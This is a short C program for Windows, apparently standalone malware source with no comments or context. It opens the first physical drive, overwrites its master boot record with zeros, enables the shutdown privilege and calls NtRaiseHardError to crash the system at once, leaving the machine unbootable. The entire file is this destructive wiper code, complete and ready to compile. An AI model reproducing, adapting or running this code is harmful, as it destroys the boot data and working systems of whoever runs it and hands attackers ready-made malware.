#include <Windows.h>
#pragma comment(lib, "ntdll.lib")

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOption, PULONG Response);

int main(){
  char mbr_data[512];
  BOOLEAN bl;
  unsigned long re;
  DWORD dwBytesWritten;
  
  ZeroMemory(&mbr_data, (sizeof mbr_data));
  HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
  WriteFile(hDevice, mbr_data, 512, &dwBytesWritten, NULL);
  CloseHandle(hDevice);
  RtlAdjustPrivilege(16, true, false, &bl);
  NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &re);
  return 0;
}
